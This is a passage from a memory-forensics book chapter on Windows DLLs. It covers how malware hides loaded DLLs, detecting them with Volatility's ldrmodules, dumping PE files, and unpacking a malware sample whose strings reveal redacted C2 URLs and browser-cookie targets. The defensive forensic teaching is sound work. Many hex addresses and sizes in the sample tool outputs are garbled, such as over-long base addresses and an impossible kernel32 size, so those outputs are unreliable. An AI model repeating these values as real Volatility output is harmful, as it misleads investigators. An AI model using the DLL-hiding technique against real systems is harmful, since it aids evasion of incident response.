- **Unexpected name paths:** Be aware of suspiciously named DLLs (such as `sodapop.dll`) as well as familiar-looking names in nonstandard locations (i.e., `C:\Windows\system32\``sys``\kernel32.dll`). We have also seen malware loading DLLs from sectors outside the NTFS partition. For example, a TDL variant referenced a module whose path started with `\\.\globalroot\Device\svchost.exe`.
- **Context:** DLLs such as `ws2_32.dll`, `crypt32.dll`, `hnetcfg.dll`, and `pstorec.dll` are used for networking, cryptography, firewall maintenance, and access to protected storage, respectively. They aren’t suspicious *per se*, but you have to consider the purpose of the application in which they are loaded.

#### How DLLs Are Loaded

DLLs can be loaded in the following ways:

- **Dynamic linking:** As part of the process initialization routines, any DLL in the executable (`.exe`) file’s IAT automatically loads in the process’ address space.
- **Dependencies:** DLLs also have import tables, so when they’re loaded, all additional DLLs on which they rely load into the process’ address space. For more information, see Dependency Walker ([http://www.dependencywalker.com/](http://www.dependencywalker.com/)).
- **Run-time dynamic linking (RTDL):** A thread can explicitly call `LoadLibrary` (or the native `LdrLoadDll`) with the name of the DLL to load. This has the same end result as dynamic linking (a DLL loaded in the process), except there’s no trace of the DLL in the process’ IAT.
- **Injections:** As you’ll learn later in the chapter, DLLs can also be forcefully injected into a target process.

#### Enumerating DLLs on Live Systems

Your basic system investigation tools will have the capability to list DLLs. For example, Process Hacker and Process Explorer both support it. Sysinternals also provides a command-line utility called `listdlls` ([http://technet.microsoft.com/en-us/sysinternals/bb896656.aspx](http://technet.microsoft.com/en-us/sysinternals/bb896656.aspx)). From a programming perspective, you can leverage the Windows API functions `CreateToolhelp32Snapshot` along with `Module32First` and `Module32Next`. Alternately, another function, `EnumProcessModules` has been available since Windows XP.

The important part about these tools and the APIs on which they depend is where they get the information. As presented in the data structures section of this chapter, three linked lists of DLLs are accessible from the PEB. They store metadata about modules in the order they were loaded and initialized, as well as where they exist in memory. Live APIs and tools typically only look at the load order list. This presents attackers the opportunity to manipulate and hide DLLs.

#### Hiding DLLs

As shown in [Figure 8-3](#figure8-3), because all three lists exist in process memory, any thread running in the process can unlink a metadata structure (`_LDR_DATA_TABLE_ENTRY`) to hide it from the running system (and potentially memory forensics as well). For example, once loaded, the `xyz.dll` module can overwrite its own `Flink` and `Blink` pointers so that its entry is skipped during enumeration.

![c08f003.eps](/api/v2/epubs/urn:orm:book:9781118824993/files/image_fi/825099c08/c08f003.png)

*[**Figure 8-3:**](#figureanchor8-3) A diagram showing how the PEB points to three doubly linked lists of DLLs*

#### Listing DLLs in Memory

The unlinking approach depicted in [Figure 8-3](#figure8-3) also affects Volatility’s `dlllist` plugin. We designed `dlllist` like this for a reason. It enumerates DLLs by walking the load order list, just like live APIs, because in some cases it’s good to see things from the perspective of tools that run on the live system. Here’s an example output from `dlllist`. In our training class, we typically ask students if they can spot anything suspicious. Can you?

```
$ python vol.py –f mem.dmp --profile=WinXPSP3x86 dlllist –p 3108

notepad.exe pid:   3108
Command line : "C:\WINDOWS\system32\notepad.exe" 
Service Pack 3

Base             Size  LoadCount Path
---------- ---------- ---------- ----
0x01000000    0x14000     0xffff C:\WINDOWS\system32\notepad.exe
0x7c900000    0xb2000     0xffff C:\WINDOWS\system32\ntdll.dll
0x7c800000    0xc60f000     0xffff C:\WINDOWS\system32\kernel32.dll
0x77dd0000    0x9b000     0xffff C:\WINDOWS\system32\ADVAPI32.dll
0x77fc00e000    0x11000     0xffff C:\WINDOWS\system32\Secur32.dll
0x77c10000    0x58000     0xffff C:\WINDOWS\system32\msvcrt.dll
0x77f10000    0x49000     0xffff C:\WINDOWS\system32\GDI32.dll
0x7e410000    0x91000     0xffff C:\WINDOWS\system32\USER32.dll
0x7c9c0000   0x817000     0xffff C:\WINDOWS\system32\SHELL32.dll
<snip>
0x7e1c00e000    0xa2000        0x3 C:\WINDOWS\system32\urlmon.dll
0x771b0000    0xaa000        0x3 C:\WINDOWS\system32\WININET.dll
0x77a80000    0x95000        0x3 C:\WINDOWS\system32\CRYPT32.dll
0x71ab0000    0x17000       0x27 C:\WINDOWS\system32\WS2_32.dll
0x71a50000    0x3f000        0x4 C:\WINDOWS\system32\mswsock.dll
0x662b0000    0x58000        0x1 C:\WINDOWS\system32\hnetcfg.dll
0x76f20000    0x27000        0x1 C:\WINDOWS\system32\DNSAPI.dll
```

The process executable (`notepad.exe`) is first to load in the process address space, thus it’s first in the load order list. Next, the `ntdll.dll` and `kernel32.dll` system libraries are loaded. The system then proceeds to load any DLLs in Notepad’s IAT and any dependency modules that those DLLs need. Note, however, that the load count for the first batch of modules is `0xffff`. Because this field is a short integer, `0xffff` is actually `-1`. A load count of `-1` means the DLL loaded because it was specified in an IAT. The others near the end, whose load counts are `0x3`, `0x27`, `0x4` and `0x1`, were all loaded via explicit calls to `LoadLibrary`.

Although there are plenty of legitimate reasons to call `LoadLibrary`, its usage is also consistent with the techniques shellcode uses to set up the target process’ address space. You may notice none of the explicitly loaded DLLs are suspicious per se—they’re all properly named and in the correct `system32` path. However, when you consider their purpose (network related) and the host process context (`notepad.exe`), the situation begins to look quite abnormal. Most likely code needing access to networking DLLs has infected this process, and it loads them by calling `LoadLibrary`.

---

**NOTE**

The DLL layout is slightly different for WOW64 processes (32-bit applications on a 64–bit operating system). The three lists in the PEB only contain the DLLs that can be accessed by the 32-bit application (i.e. those below `MmHighestUserAddress`) and the WOW64 compatibility DLLs. For example, `dlllist` output for these processes looks like this:

```
$ python vol.py -f win764bit.raw --profile=Win7SP0x64 dlllist -p 2328
Volatility Foundation Volatility Framework 2.4
************************************************************************
iexplore.exe pid:   2328
Command line : "C:\Program Files (x86)\Internet Explorer\iexplore.exe" 
Note: use ldrmodules for listing DLLs in WOW64 processes

Base               Size      LoadCount Path
------------------ --------- ------------------ ----
0x0000000001350000   0xa6000  0xffff C:\Program Files (x86)\Internet 
Explorer\iexplore.exe
0x0000000077520000  0x1ab000  0xffff C:\Windows\SYSTEM32\ntdll.dll
0x0000000073b80000   0x3f000     0x3 C:\Windows\SYSTEM32\wow64.dll
0x0000000073b20000   0x5c000     0x1 C:\Windows\SYSTEM32\wow64win.dll
0x0000000074e10000    0x8000     0x1 C:\Windows\SYSTEM32\wow64cpu.dll
```

The three WOW64 libraries (and `ntdll.dll`) contain the entry points for 32-bit applications and the necessary code to transition into 64-bit mode so the calling thread can access DLLs in higher address regions. As the note tells you, you can use the `ldrmodules` plugin (discussed in detail next) to enumerate DLLs in a WOW64 process—even those not typically accessible to 32-bit applications.

For more information on these concepts, see *WOW64 Implementation Details*: [http://msdn.microsoft.com/en-us/library/windows/desktop/aa384274(v=vs.85).aspx](http://msdn.microsoft.com/en-us/library/windows/desktop/aa384274(v=vs.85).aspx).

---

#### Detecting Unlinked DLLs

The hiding technique shown in [Figure 8-3](#figure8-3) is relatively effective, despite being primitive and very simple. There are more robust ways to hide DLLs that you’ll also encounter in the wild. For example, if there are three lists, and malware hides from one, you can easily cross-reference with the other two and see what’s missing. Thus, as far back as 2007 (see [http://www.openrce.org/blog/view/844/How_to_hide_dll](http://www.openrce.org/blog/view/844/How_to_hide_dll)), folks in the offensive community began unlinking DLLs from all three lists. All attackers had to do was include two to three extra lines of code that cut a metadata structure from the memory order and initialization order lists as well.

Two methods can help you detect DLLs that are unlinked from all three lists:

- **PE file scanning**: You can leverage techniques described in Chapter 7 to perform a brute force scan through process memory, looking for all instances of PE files (based on their known `MZ` header signatures). Remember, however, that the PE headers are also in process memory, so the same body of code that unlinks the DLL metadata structure can easily overwrite them.
- **VAD cross-referencing**: This is the technique implemented by Volatility’s `ldrmodules` plugin. If you recall from Chapter 7, VAD nodes contain full paths on disk to files mapped into the regions—including DLL files. The unique aspect of VADs is that they exist in kernel memory and attempts to manipulate the tree (i.e., unlink a VAD node) or overwrite their file pointers quickly result in system instability (blue screens).

The `ldrmodules` plugin first enumerates all VAD nodes that contain mapped executable images. Specifically, it looks for large nodes with `PAGE_EXECUTE_WRITECOPY` protections, a `VadImageMap` type, and the `Image` control flag set. It then compares the starting addresses from the VAD nodes with the `DllBase` value from the `_LDR_DATA_TABLE_ENTRY` structures found in process memory. Entries identified through the VAD that aren’t represented in the DLL lists are potentially hidden. An example of the output from an infected 64–bit Windows 7 sample follows:

```
$ python vol.py -f memory.dmp --profile=Win7SP1x64 ldrmodules -p 616 
Volatility Foundation Volatility Framework 2.4 
Process      Base               InLoad InInit InMem MappedPath
------------ ------------------ ------ ------ ----- ----------
svchost.exe  0x0000000074340000 True   True   True  \Windows\[snip]\sfc.dll
svchost.exe  0x00000000779a0000 True   True   True  \Windows\[snip]\ntdll.dll
svchost.exe  0x000007feff570000 False  False  False \Windows\[snip]\lpkz2.dll
svchost.exe  0x0000000077780000 True   True   True  \Windows\[snip]\kernel32.dll
svchost.exe  0x000007fefd990000 True   True   True  \Windows\[snip]\msasn1.dll
svchost.exe  0x000007fefbbc00e000 True   True   True  \Windows\[snip]\wtsapi32.dll
svchost.exe  0x000007fefdac0000 True   True   True  \Windows\[snip]\KernelBase.dll
svchost.exe  0x000007fefcc00000 True   True   True  \Windows\[snip]\gpapi.dll
svchost.exe  0x000007fefb800000 True   True   True  \Windows\[snip]\ntmarta.dll
svchost.exe  0x000007fefcc20000 True   True   True  \Windows\[snip]\userenv.dll
svchost.exe  0x000007fefbd60000 True   True   True  \Windows\[snip]\xmllite.dll
svchost.exe  0x000007feff460000 True   True   True  \Windows\[snip]\oleaut32.dll
svchost.exe  0x000007fefde70000 True   True   True  \Windows\[snip]\urlmon.dll
svchost.exe  0x000007fef9290000 True   True   True  \Windows\[snip]\wscapi.dll
[snip]
svchost.exe  0x00000000ff720000 True   False  True  \Windows\[snip]\svchost.exe
svchost.exe  0x000007fefd8c00f000 True   True   True  \Windows\[snip]\profapi.dll
svchost.exe  0x000007fefdd10000 True   True   True  \Windows\[snip]\usp10.dll
```

`lpkz2.dll` does not exist in any of the three DLL lists in process memory, but the VAD in kernel memory has a record of it. You can also see its base address is `0x000007feff570000`, which you can then pass to the `dlldump` plugin (introduced later in the chapter) to extract it from memory.

Notice that the `svchost.exe` entry displays `False` in the `InInit` column (initialization order list). This is an exception to the rule regarding the ability to detect unlinked DLLs by cross-referencing data sources. You will never find the process executable (`.exe`) in the initialization order list because the executable is initialized differently from all other modules. In particular, it’s not a DLL, so there’s no `DllMain` function to be called.

---

**Warning**

Malware has also been known to overwrite the `FullDllName` and `BaseDllName` members of the `_LDR_DATA_TABLE_ENTRY` structures, rather than unlinking the metadata structure. McAfee reported a ZeroAccess variant behaving in this manner (see *ZeroAccess Misleads Memory-File Link:*[http://blogs.mcafee.com/mcafee-labs/zeroaccess-misleads-memory-file-link](http://blogs.mcafee.com/mcafee-labs/zeroaccess-misleads-memory-file-link)). In this case, live APIs on the system, in addition to Volatility’s `dlllist` plugin, would show a fake path of `c:\windows\system32\n`, but the VAD in kernel memory would still contain the original path to the DLL. The `-v/--verbose` option to `ldrmodules` will print the full paths from all sources, and you’ll see the discrepancy.

---

## PE Files in Memory

One of the most useful features of Volatility is its capability to dump and rebuild PE files (executables, DLLs, and kernel drivers). Because of changes that occur during program execution, it is not likely that you will get an exact copy of the original binary—or even one that runs on another machine. However, the dumped copy should be close enough to the original so that you can disassemble the malware and determine its capabilities, reverse any algorithms, and so forth. We are frequently asked whether it is possible to dump an executable and compare its MD5 or SHA1 hash to the file on disk. Although it may be possible to compare *fuzzy hashes* (e.g., the percentage similarity), cryptographic hashes will never match because of the following:

- **IAT patching:** The loader modifies a PE file’s IAT to contain the addresses of API functions in process memory. The addresses are specific to the machine and instance of the process from which the PE was extracted.
- **Inaccessible sections:** Not all PE sections are loaded into memory. For example, in some cases, the resource section (`.rsrc`) might not be loaded until it’s needed. Obviously, data never read into memory in the first place is not accessible when you dump it.
- **Global variables:** A PE file can define global variables or values in its read/write data section that are modified during execution. Thus, when you dump the PE from memory, you get the current values, not the uninitialized original ones.
- **Self-modifying code:** Many PE files, especially malicious ones, modify their own code at run time. For example, packed applications decompress and/or decrypt instructions in memory.

Although you should be aware of these concepts, they’re not necessarily disadvantages or caveats of memory analysis. In fact, some of them can actually play in your favor. For example, one of the global variables may be an encryption key for command and control traffic. Likewise, the PE file may be packed on disk, preventing you from statically analyzing it. By dumping the PE file from memory, you can recover data in the format that most closely resembles the current state of the application.

---

**NOTE**

We don’t cover the internals of PE files in this book, but it’s very useful to know. For a crash course, see the following classics by Matt Pietrek:

*An In-Depth Look into the Windows Portable Executable File Format*: [http://msdn.microsoft.com/en-us/magazine/cc301805.aspx](http://msdn.microsoft.com/en-us/magazine/cc301805.aspx).

*Peering Inside the PE: A Tour of the Win32 Portable Executable File Format*: [http://msdn.microsoft.com/en-us/magazine/ms809762.aspx](http://msdn.microsoft.com/en-us/magazine/ms809762.aspx).

---

### PE File Slack Space

Another reason why PE files dumped from memory often differ from the original file on disk is because of slack space. The smallest page size on a typical x86 or x64 Windows system is 4,096 bytes. Most PE files have sections that are not exact multiples of the smallest page size. [Figure 8-4](#figure8-4) shows the effect that this has on reconstructing binaries from memory. The `.text` section, which is not an exact multiple of 4,096, must fully exist in memory marked as RX (read, execute), and the `.data` section must fully exist in memory marked as RW (read, write). Because protections are applied at the page level (in other words, if a page is marked as executable, *all* bytes in the page are executable), the two sections must be separated after being loaded into memory. Otherwise, the beginning of the `.data` section ends up being RX instead of RW.

![c08f004.eps](/api/v2/epubs/urn:orm:book:9781118824993/files/image_fi/825099c08/c08f004.png)

*[**Figure 8-4:**](#figureanchor8-4) A diagram showing how PE files expand in memory, leaving slack space between sections*

The dotted lines in [Figure 8-4](#figure8-4) indicate page boundaries, and the filled-in areas represent slack space due to section sizes that are not multiples of the page size. In some cases, the slack space contains just uninitialized data, making it irrelevant to your investigation. However, the slack space can also contain critical evidence, especially when dealing with packed files whose sections shift and change during decompression.

### Parsing PE Headers in Memory

Volatility provides a few APIs that can help you parse PE headers in memory. Plugins exist that wrap most of this functionality, so you don’t need to perform these manual steps. However, for those of you interested in how the PE-dumping plugins work behind the scenes, and especially if you plan on developing your own tools that rely on similar functionality, the following tutorial will be useful. For example, a while back, we wrote a custom plugin to find and automatically extract ZeroAccess binaries ([http://mnin.blogspot.com/2011/10/zeroaccess-volatility-and-kernel-timers.html](http://mnin.blogspot.com/2011/10/zeroaccess-volatility-and-kernel-timers.html)) using the PE dumping APIs.

The following example shows you how to use `volshell` to verify that the process’ claimed base address does in fact contain the signature of a DOS header:

```
$ python vol.py -f memory.dmp --profile=Win7SP1x64 volshell -p 516
Volatility Foundation Volatility Framework 2.4 
Current context: process lsass.exe, pid=516, ppid=400 DTB=0x19e6b000
To get help, type 'hh()'
>>> process = proc() 
>>> db(process.Peb.ImageBaseAddress)
0xff080000  4d5a 9000 0300 0000 0400 0000 ffff 0000   MZ..............
0xff080010  b800 0000 0000 0000 4000 0000 0000 0000   ........@.......
0xff080020  0000 0000 0000 0000 0000 0000 0000 0000   ................
0xff080030  0000 0000 0000 0000 0000 0000 f000 0000   ................
0xff080040  0e1f ba0e 00b4 09cd 21b8 014c cd21 5468   ........!..L.!Th
0xff080050  6973 2070 726f 6772 616d 2063 616e 6e6f   is.program.canno
0xff080060  7420 6265 2072 756e 2069 6e20 444f 5320   t.be.run.in.DOS.
0xff080070  6d6f 6465 2e0d 0d0a 2400 0000 0000 0000   mode....$.......
```

The `MZ` signature appears intact. The next step to validate the PE header format is to follow the `e_lfanew` member to find the NT header. Instead of doing this by hand, you can create an `_IMAGE_DOS_HEADER` at the base address and then use the `get_nt_header` function. Here’s an example:

```
>>> process_space = process.get_process_address_space()
>>> dos_header = obj.Object("_IMAGE_DOS_HEADER", 
...                   offset = process.Peb.ImageBaseAddress, 
...                   vm = process_space)
...
>>> nt_header = dos_header.get_nt_header()
>>> db(nt_header.obj_offset)
0xfc08f000f0  5045 0000 6486 0600 55c1 5b4a 0000 0000   PE..d...U.[J....
0xff080100  0000 0000 f000 2200 0b02 0900 0028 0000   ......"......(..
0xff080110  0052 0000 0000 0000 5018 0000 0010 0000   .R......P.......
0xff080120  0000 08ff 0000 0000 0010 0000 0002 0000   ................
```

Now that you have an NT header, the following code shows how to print the name, relative virtual address, and virtual size of each section. To compute the absolute address of each section, just add the base address of the DOS header to the relative offset. For example, you can find the `.text` section at `0xff080000 + 0x1000 = 0xff081000` for this process:

```
>>> for sec in nt_header.get_sections():
...   print sec.Name, hex(sec.VirtualAddress), hex(sec.Misc.VirtualSize)
... 
.text   0x1000L 0x26beL
.rdata  0x4000L 0x3a74L
.data   0x8000L 0x7a0L
.pdata  0x9000L 0x3e4L
.rsrc   0xa000L 0x700L
.reloc  0xb000L 0x1d4L
```

You should have a good idea of how the PE file contents are carved from memory at this point. Nevertheless, to complete our example, here’s the code you can use to dump a copy of each section to disk. You can optionally pass a parameter to `get_image` so it preserves slack space; however, you will read more about that in the next section. Note that after we finish writing data to the file (`dumped.exe`), we quit `volshell` and check the output file’s type:

```
>>> outfile = open("dumped.exe", "wb")
>>> for offset, code in dos_header.get_image():
...     outfile.seek(offset)
...     outfile.write(code)
... 
>>> outfile.close()
>>> quit()

$ file dumped.exe 
dumped.exe: PE32+ executable for MS Windows (GUI) 
```

---

**NOTE**

After you create the `_IMAGE_DOS_HEADER` object in Volatility, you can also list its imported or exported functions, print its version information, or perform a number of other actions on a PE file. We don’t show code examples here, but you can see the `pe_vtypes.py` file in the source for API usage.

---

### PE Extraction Plugins

You’ve already seen the APIs and background for how Volatility extracts PE files from memory. This section will show you some of the existing plugins (and the options they take) that can automate the process. Here are their names and short descriptions:

- `procdump`: Dump a process executable. You can identify the process by PID (`--pid`) or the physical offset of its `_EPROCESS` (`--offset`). The latter option enables you to dump processes hidden from the active process list.
- `dlldump`: Dump a DLL. You can identify the *host* process by PID (`--pid`) or the physical offset of its `_EPROCESS` (`--offset`). If the DLL(s) are in the load order list, you can identify them using a regular expression (`--regex/--ignore-case`) on their name. Otherwise, you can refer to them by their base address in process memory (`--base`). The latter option enables you to dump hidden or injected PE files.
- `moddump`: Dump a kernel module. Similar to `dlldump`, if the modules you want are in the loaded modules list (see Chapter 13), you can identify them with regular expressions. Otherwise, to dump a PE file from anywhere in kernel memory, use the `--base` parameter.

All the plugins require an output directory (`--dump-dir`) to write the extracted files. They also all accept an optional `--memory` parameter, which is how you request the slack space between sections to be included in the output file. Thus, when you use `--memory`, the dumped file more closely resembles the PE as it existed in memory. A few examples of using these plugins follow. The first one shows how to extract all executables in the active process list:

```
$ python vol.py -f memory.dmp --profile=Win7SP1x64 
    procdump --dump-dir=OUTDIR/

Volatility Foundation Volatility Framework 2.4
ImageBase          Name                 Result
------------------ -------------------- ------
------------------ System               Error: PEB at 0x0 is unavailable
0x0000000047c50000 smss.exe             OK: executable.256.exe
0x000000004a3c00e000 csrss.exe            OK: executable.348.exe
0x00000000ff9c0000 wininit.exe          OK: executable.400.exe
0x000000004a3c00e000 csrss.exe            OK: executable.408.exe
0x00000000ffa10000 winlogon.exe         OK: executable.444.exe
[snip]
```

It failed to extract the `System` process, but that’s normal—this process has no corresponding executable. Notice the name of the output file is based on the PID of the process (`executable.PID.exe`). Here’s another example showing how to extract a process *that’s not in the active process list* based on the physical offset of its `_EPROCESS` (which you can get with `psscan` or `psxview`):

```
$ python vol.py -f memory.dmp --profile=Win7SP1x64 
     procdump --offset=0x000000003e1e6b30 
     –-dump-dir=OUTDIR/

Volatility Foundation Volatility Framework 2.4
Process(V)         ImageBase          Name         Result
------------------ ------------------ ------------ ------
0xfffffa8002be6b30 0x0000000000400000 warrant.exe  OK: executable.3036.exe
```

The next command extracts any DLL from PID 1408 that has a name or path matching the case-insensitive “crypt” string. The output files are named according to the PID and physical offset of the host process and the base virtual address of the DLL (`module.PID.OFFSET.ADDRESS.dll`):

```
$ python vol.py -f memory.dmp --profile=Win7SP1x64 
     dlldump -p 1408 --regex=crypt 
     --ignore-case 
     --dump-dir=OUTDIR/ 

Volatility Foundation Volatility Framework 2.4
Name          Module Base   Module Name   Result
------------- ------------- ------------- ------
explorer.exe  0x7fefd130000 CRYPTSP.dll   module.1408.3e290b30.7fefd130000.dll
explorer.exe  0x7fefc5c0000 CRYPTUI.dll   module.1408.3e290b30.7fefc5c0000.dll
explorer.exe  0x7fefd7c00e000 CRYPTBASE.dll module.1408.3e290b30.7fefd7c00e000.dll
explorer.exe  0x7fefdb30000 CRYPT32.dll   module.1408.3e290b30.7fefdb30000.dll
```

The regular expression option works only with DLLs in the PEB lists. You cannot dump hidden or injected DLLs by name because often you don’t have a name—only a base address where the DOS header exists. In those cases, you can specify the `--base` like this:

```
$ python vol.py -f memory.dmp --profile=Win7SP1x64 
     dlldump -p 1148 --base=0x000007fef7310000 
     --dump-dir=OUTDIR/ 
     --memory

Volatility Foundation Volatility Framework 2.4
Name          Module Base   Module Name Result
------------- ------------- ----------- ------
spoolsv.exe   0x7fef7310000 UNKNOWN     module.1148.3e79bb30.7fef7310000.dll
```

---

**NOTE**

This book doesn’t cover live analysis tools in detail, but it’s worth noting that the following tools can help you dump processes from running systems:

- Sysinternals ProcDump and Process Explorer: [http://technet.microsoft.com/en-us/sysinternals/dd996900.aspx](http://technet.microsoft.com/en-us/sysinternals/dd996900.aspx)
- Process Hacker: [http://processhacker.sourceforge.net](http://processhacker.sourceforge.net)

---

### Caveats and Workarounds

One thing to note about these plugins is that they’re susceptible to attacks that manipulate PE header values. For example, if the `MZ` or `PE` signature isn’t found, they cannot properly locate the sections. Furthermore, they also rely on the *advertised* section virtual addresses and sizes, which malicious code can easily overwrite. If a section claims to be much larger or smaller than it actually is, the output file will have either extraneous data or missing data. Another reason why these plugins can fail is simply due to chance. If the page(s) containing the PE header or section information are swapped to disk, the header validation routines fail.

If you encounter issues dumping PE files from process memory, whether it’s the process executable or a DLL, you can always fall back to just dumping the containing VAD region. If you remember from Chapter 7, the `vaddump` plugin produces a padded file to maintain spatial integrity, and it does not know (or care) about the PE file format. This enables you to still acquire the data even if it has been intentionally corrupted. However, it might require manual fix-ups before it loads in external tools such as IDA Pro or PE viewers. Another alternative is to use the `dumpfiles` plugin (see Chapter 16) that extracts cached copies of the PE files from disk. In this case, you won’t get slack space, modified global variables, or decompressed versions of packed files.

## Packing and Compression

The layers of obfuscation introduced by packed or compressed binaries are often removed when they load into memory. In almost all cases, before executing the main payload, a self-modifying program decompresses in place, or moves to another address and then decompresses. [Figure 8-5](#figure8-5) shows the life cycle of a binary that gets packed and then loaded in memory. Before packing, the PE file’s entry point is within its `.text` section (likely the `main` or `DllMain` function), and all strings and code are in plain text. You can perform static analysis of the binary at this stage. However, after it’s packed, the strings and code are compressed and optionally encrypted or encoded. Also, a new section has been added to the binary that contains the unpacking code, and the entry point now leads to this new section. Statically analyzing the file at this point will most certainly fail.

![c08f005.eps](/api/v2/epubs/urn:orm:book:9781118824993/files/image_fi/825099c08/c08f005.png)

*[**Figure 8-5:**](#figureanchor8-5) The life cycle of a program being packed and loaded into memory*

When the binary is loaded into memory, the entry point function (unpacking code) decompresses the original strings and data so the program can access them. Next the real `main` or `DllMain` routine is called to invoke the program’s normal behavior. Anytime between now and when the DLL unloads or the process terminates, you should be able to dump the decompressed code from memory. Finding it is rarely an issue because you have `dlllist`, `ldrmodules`, and `malfind` (described in the next section) to provide you with base addresses. Paired with `procdump`, `dlldump`, and `moddump`, you have a pretty flexible toolset for acquiring the data you need for static analysis.

---

**NOTE**

Your ability to dump decompressed code depends on the design of the packer. A majority of packers used in the wild operate in a manner consistent with our description, but not all of them. For example, virtual machine (VM) packers such as VMProtect ([http://vmpsoft.com/products/vmprotect](http://vmpsoft.com/products/vmprotect)) and Themida ([http://www.oreans.com/themida.php](http://www.oreans.com/themida.php)) are especially problematic because they never fully unpack in memory. In fact, the code is transformed so that it’s often not technically possible to derive the original code. In these cases, we tend to focus on artifacts left in memory when the programs execute—for example, the network connections, open file handles, services they create, and so on.

---

### Unpacking Malicious Code

This section demonstrates a practical example of using memory analysis to unpack a malware sample. [Figure 8-6](#figure8-6) shows the functions that the packed sample imports from `kernel32.dll` (shown via CFF Explorer from [http://www.ntcore.com/exsuite.php](http://www.ntcore.com/exsuite.php)). You can typically look at a program’s imports and get a general idea of its functionality, but in this case you don’t see much—which indicates the packer obfuscates the IAT as well as the program’s instructions. However, because it includes `GetProcAddress` and `LoadLibraryW`, it can load and access any APIs it needs at run time.

![c08f006.tif](/api/v2/epubs/urn:orm:book:9781118824993/files/image_fi/825099c08/c08f006.png)

*[**Figure 8-6:**](#figureanchor8-6) The packed malware’s Import Address Table contains only a few functions.*

If you extract strings from the binary, you’ll see that there aren’t many—besides the DOS message and some partly familiar items at the top. For example, `zirtualAlloc` and `zegOpenKeyExW` closely resemble `VirtualAlloc` and `RegOpenKeyExW` (names of Windows API functions). These are suspicious indeed and they probably indicate an attempt to bypass string-based signatures:

```
$ strings -a -n 8 734aa.ex_ > strings.txt
$ strings -a -n 8 –el 734aa.ex_ >> strings.txt
$ cat strings.txt
!This program cannot be run in DOS mode.
PUSHBUTTON
zirtualAlloc
zegOpenKeyExW

[snip]

X660~6B0&6v0
1C55145F1
KhdoUuDiPcctMtyAb
%ctM5bul
j32Dbllb
wsvcPr.dFj

[snip]

9#949A9N9v9{9
8$8*80868<8B8H8N8T8Z8`8f8l8r8x8~8
120609072050Z
391231235959Z0
```

At this point, it’s pretty obvious that the sample is packed. You can execute it in a controlled environment (such as a VM with networking disabled) to allow the program to unpack in memory. While it’s running, capture its state by taking a snapshot of your VM or dumping memory. Then use `procdump` to extract the decompressed code, as shown here:

```
$ python vol.py -f infected.vmem procdump -p 3060 --dump-dir=OUTDIR/
Volatility Foundation Volatility Framework 2.4
Process(V) ImageBase  Name       Result
---------- ---------- ---------- ------
0x81690c10 0x00400000 734aa.ex_    OK: executable.3060.exe
```

Now that you have a sample extracted from memory, run strings on it again and see the difference:

```
$ strings -a -n 8 executable.3060.exe > strings.txt
$ strings -a -n 8 –el executable.3060.exe >> strings.txt
$ cat strings.txt
!This program cannot be run in DOS mode.

[snip]

Software\Microsoft\WSH\
Mozilla\Firefox\Profiles
cookies.*
Macromedia
firefox.exe
iexplore.exe
explorer.exe
Content-Length

[snip]

http://REDACTED.65.40:8080/zb/v_01_a/in/
http://REDACTED.189.124:8080/zb/v_01_a/in/
http://REDACTED.154.199:8080/zb/v_01_a/in/
http://REDACTED.150.163:8080/zb/v_01_a/in/
Software\Microsoft\Windows\CurrentVersion\Run
[snip]
```

The output tells you a lot about the malware’s functionality. Although they are just strings, not direct code correlations, sometimes that’s all you need to generate an initial list of indicators such as contacted IPs and modified registry keys.

### Common Unpacking Issues

You can save an enormous amount of time by just letting the malware natively unpack in memory as opposed to using a debugger to reverse-engineer samples, but there are some disadvantages as well. For example, as previously mentioned, some samples never fully unpack. You also might run into samples that don’t stay active long enough for you to capture memory. In those cases, we recommend using a debugger to run the malware and set a breakpoint on `ExitProcess`: It gets “frozen” while you access what you need. Of course, you can also find debugger-aware samples, so make sure to read Recipe 9-11 (“Preventing Processes from Terminating”) in *Malware Analyst’s Cookbook.* It shows you how to suspend a process when it tries to exit by placing hooks in the kernel.

### Unpacking 64-bit DLLs

Unpacking DLLs on 64-bit Windows is technically no different from executables on 32-bit platforms. As we were preparing to write this section of the chapter, we received a Rovnix ([http://www.xylibox.com/2013/10/reversible-rovnix-passwords.html](http://www.xylibox.com/2013/10/reversible-rovnix-passwords.html)) sample that was implemented as a DLL and targeted 64-bit systems. As shown in [Figure 8-7](#figure8-7), the sample was packed. If you’re not familiar with IDA Pro, the horizontal bar below the main menu (known as the color bar) displays the segments in the file that contain instructions versus undefined data. A majority of this file was undefined. Furthermore, the entry point function calls `VirtualAlloc`—probably to allocate a memory region to use as the “scratch pad” where decompression can occur. You can also see 62 exported functions with names that resemble database APIs. Viewing their code (not shown here), you see that they consist of only no-operations (NOPs).

![c08f007.eps](/api/v2/epubs/urn:orm:book:9781118824993/files/image_fi/825099c08/c08f007.png)

*[**Figure 8-7:**](#figureanchor8-7) The DLL loaded in IDA Pro shows various signs of being compressed or encrypted.*

Chapter 13 (“Working with DLLs”) in *Malware Analyst’s Cookbook* contains some useful hints that you can leverage here. The goal is to get the DLL loaded so that it can unpack and then keep it there long enough for you to acquire memory. We use `rundll32.exe` (which is actually a 64-bit executable on 64-bit platforms, despite its name) as the host process—it takes care of mapping the malicious DLL in memory and calling its entry point function (`DllMain`). Here is the command we use:

```
C:\Users\Elliot\Desktop\> rundll32 dd4382d225a[snip].dll,FakeExport
```

---

**NOTE**

The name of the exported function to call is `FakeExport`, which is completely inconsequential. By the time `FakeExport` is referenced by `rundll32.exe`, the malicious DLL is already loaded. It could easily be one of the exports you see in [Figure 8-7](#figure8-7), or you could make up another term to use. Strangely, you can’t just leave off the export name or else you get a syntax error from `rundll32.exe`.

---

With the DLL loaded, capture memory and then determine its base address with `dlllist`, as shown here:

```
$ python vol.py -f memory.dmp --profile=Win7SP1x64 -p 1524 dlllist
Volatility Foundation Volatility Framework 2.4 
************************************************************************
rundll32.exe pid:   1524
Command line : rundll32  dd4382d225a15dc09f92616131eff983.dll,FakeEntry
Service Pack 1

Base                Size    LoadCount Path
------------------ -------  ------------------ ----
0x00000000ffbc00f000   0xf000  0xffff C:\Windows\system32\rundll32.exe
0x0000000077040000 0x1a9000  0xffff C:\Windows\SYSTEM32\ntdll.dll
0x0000000076e20000 0x11f000  0xffff C:\Windows\system32\kernel32.dll
[snip]
0x0000000180000000  0x15000     0x1 C:\Users\Elliot\Desktop\dd438[snip].dll
0x000007fefe090000  0xdb000     0x2 C:\Windows\system32\ADVAPI32.dll
0x000007fefe040000  0x1f000     0x8 C:\Windows\SYSTEM32\sechost.dll
0x000007fefde50000 0x12d000     0x6 C:\Windows\system32\RPCRT4.dll
[snip]
```

